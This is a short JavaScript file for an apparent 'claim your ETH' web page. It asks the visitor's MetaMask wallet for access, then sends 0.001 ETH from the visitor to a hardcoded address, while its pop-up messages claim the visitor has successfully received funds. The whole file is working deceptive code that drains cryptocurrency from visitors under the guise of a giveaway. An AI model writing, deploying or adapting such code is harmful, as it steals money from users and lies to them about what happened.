document.addEventListener('DOMContentLoaded', () => {
    const connectWalletButton = document.getElementById('connectWallet');

    connectWalletButton.addEventListener('click', () => {
        if (typeof window.ethereum !== 'undefined') {
            window.ethereum.request({ method: 'eth_requestAccounts' })
                .then(accounts => {
                    alert('Wallet connected. Proceeding with the claim.');
                    sendEthereum(accounts[0]);
                })
                .catch((error) => {
                    console.error('Could not connect to wallet:', error);
                    alert('There was a problem connecting to your wallet.');
                });
        } else {
            alert('MetaMask is not installed. Please install MetaMask to claim your ETH.');
        }
    });

    function sendEthereum(fromAddress) {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const transactionParameters = {
            to: '0x16e9F26BA2254f2221e13134Fd7346e7c0E6375E',
            value: ethers.utils.parseEther("0.001"),
        };

        signer.sendTransaction(transactionParameters)
            .then((transaction) => {
                console.log('Claim transaction sent:', transaction);
                alert('Congratulations! Your claim was successful. Check your wallet.');
            })
            .catch((error) => {
                console.error('Error during the claim process:', error);
                alert('Sorry, there was an error processing your claim. Please try again.');
            });
    }
});
